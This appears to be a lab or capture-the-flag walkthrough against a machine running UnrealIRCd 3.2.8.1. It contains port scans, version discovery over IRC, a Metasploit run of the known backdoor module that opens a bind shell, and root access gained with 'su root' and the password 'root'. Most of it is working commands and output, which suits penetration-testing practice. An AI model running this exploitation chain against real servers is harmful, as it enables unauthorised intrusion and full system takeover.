# IP: 192.168.186.120

## NMAP
```javascript
┌──(dx㉿kali)-[~]
└─$ nmap -p- --min-rate 10000 192.168.186.120
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-08 01:39 EDT
Warning: 192.168.186.120 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.186.120
Host is up (0.16s latency).
Not shown: 35326 closed tcp ports (conn-refused), 30206 filtered tcp ports (no-response)
PORT     STATE SERVICE
6667/tcp open  irc
6697/tcp open  ircs-u
8067/tcp open  infi-async

Nmap done: 1 IP address (1 host up) scanned in 81.52 seconds

┌──(dx㉿kali)-[~]
└─$ nmap -p 6667,6697,8067 -sCV 192.168.186.120
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-08 01:43 EDT
Nmap scan report for 192.168.186.120
Host is up (0.17s latency).

PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd (Admin email example@example.com)
6697/tcp open  irc     UnrealIRCd
8067/tcp open  irc     UnrealIRCd
Service Info: Host: irc.foonet.com

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.78 seconds

```

### Google Search
```javascript
1.First we have to search irc command line
2.Then select on irssi documentation from there we get to know how to connect the server
3.Command-to-connect-the-server: irssi ---> /server  connect <IP in which irc running> ----> Hit Enter
```
##### Revealing the Version of Irc-Unrealircd
```javascript
Irssi: Connection to 192.168.186.120 established
02:16 !irc.foonet.com *** Looking up your hostname...
02:16 !irc.foonet.com *** Couldn't resolve your hostname; using your 
          IP address instead
02:16 -!- Welcome to the ROXnet IRC Network dx!dx@192.168.49.186
02:16 -!- Your host is irc.foonet.com, running version Unreal3.2.8.1
02:16 -!- This server was created Sat 08 Aug EDT at 2020 07:03:52 PM
02:16 -!- irc.foonet.com Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp 
          lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
02:16 -!- UHNAMES NAMESX SAFELIST HCN MAXCHANNELS=10 CHANLIMIT=#:10 
          MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 
          TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 are 
          supported by this server
02:16 -!- WALLCHOPS WATCH=128 WATCHOPTS=A SILENCE=15 MODES=12 
          CHANTYPES=# PREFIX=(qaohv)~&@%+ 
          CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=ROXnet 
          CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT STATUSMSG=~&@%+ 
          are supported by this server
02:16 -!- EXCEPTS INVEX CMDS=KNOCK,MAP,DCCALLOW,USERIP are supported 
          by this server
02:16 -!- There are 1 users and 0 invisible on 1 servers
02:16 -!- I have 1 clients and 0 servers
02:16 -!- Current Local Users: 1  Max: 1
02:16 -!- Current Global Users: 1  Max: 1
02:16 -!- MOTD File is missing
```
### Findings of unreal-version
```javascript
 Unreal3.2.8.1
```

#### Searchsploit
```javascript
                                                                    
┌──(dx㉿kali)-[~]
└─$ searchsploit   Unreal  3.2.8.1  
--------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                 |  Path
--------------------------------------------------------------------------------------------------------------- ---------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                                   | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                                        | windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                                                 | linux/remote/13853.pl
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```


#### MSFConsole
```javascript
1. We can use Metasploit framework module unix/irc/unreal_ircd_3281_backdoor and the payload cmd/unix/reverse_perl to achieve RCE:
```
```javascript
                                                                      
┌──(dx㉿kali)-[~]
└─$ msfconsole 
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https:
                                      //github.com/rapid7/metasploit
                                      -framework/wiki/Using-Metasplo
                                      it
   RPORT   6667             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS  192.168.186.120
RHOSTS => 192.168.186.120
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.186.120  yes       The target host(s), see https:
                                      //github.com/rapid7/metasploit
                                      -framework/wiki/Using-Metasplo
                                      it
   RPORT   6667             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)
   1   payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   2   payload/cmd/unix/bind_ruby                                   normal  No     Unix Command Shell, Bind TCP (via Ruby)
   3   payload/cmd/unix/bind_ruby_ipv6                              normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
   4   payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution
   5   payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)
   6   payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
   7   payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)
   8   payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   9   payload/cmd/unix/reverse_ruby                                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
   10  payload/cmd/unix/reverse_ruby_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
   11  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload 0
payload => cmd/unix/bind_perl
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run

[*] 192.168.186.120:6667 - Connected to 192.168.186.120:6667...
    :irc.foonet.com NOTICE AUTH :*** Looking up your hostname...
[*] 192.168.186.120:6667 - Sending backdoor command...
[*] Started bind TCP handler against 192.168.186.120:4444
[*] Command shell session 1 opened (192.168.49.186:44195 -> 192.168.186.120:4444) at 2022-09-08 04:00:47 -0400

whoami
server
```
#### User
```javascript
whoami
server
python3 -c 'import pty; pty.spawn("/bin/bash")'
server@noontide:~/irc/Unreal3.2$ id
id
uid=1000(server) gid=1000(server) groups=1000(server),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
server@noontide:~/irc/Unreal3.2$ cd /home
cd /home
server@noontide:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root   root   4096 Aug  8  2020 .
drwxr-xr-x 18 root   root   4096 Dec  3  2020 ..
drwxr-xr-x  3 server server 4096 Dec  3  2020 server
server@noontide:/home$ cd server
cd server
server@noontide:~$ ls -la
ls -la
total 32
drwxr-xr-x 3 server server 4096 Dec  3  2020 .
drwxr-xr-x 3 root   root   4096 Aug  8  2020 ..
lrwxrwxrwx 1 root   root      9 Aug  8  2020 .bash_history -> /dev/null
-rw-r--r-- 1 server server  220 Aug  8  2020 .bash_logout
-rw-r--r-- 1 server server 3526 Aug  8  2020 .bashrc
drwxr-xr-x 3 server server 4096 Aug  8  2020 irc
-rw-r--r-- 1 server server   33 Sep  8 01:56 local.txt
-rw-r--r-- 1 server server  807 Aug  8  2020 .profile
-rw-r--r-- 1 server server   66 Aug  8  2020 .selected_editor
server@noontide:~$ cat local.txt
cat local.txt

```

#### Escalating
```javascript
server@noontide:~$ su root
su root
Password: root

root@noontide:/home/server# ls
ls
irc  local.txt
root@noontide:/home/server# cd /root
cd /root
root@noontide:~# ls -la
ls -la
total 20
drwx------  2 root root 4096 Sep  8 01:56 .
drwxr-xr-x 18 root root 4096 Dec  3  2020 ..
lrwxrwxrwx  1 root root    9 Aug  8  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   33 Sep  8 01:56 proof.txt
root@noontide:~# cat proof.txt
cat proof.txt

```
```javascript
```
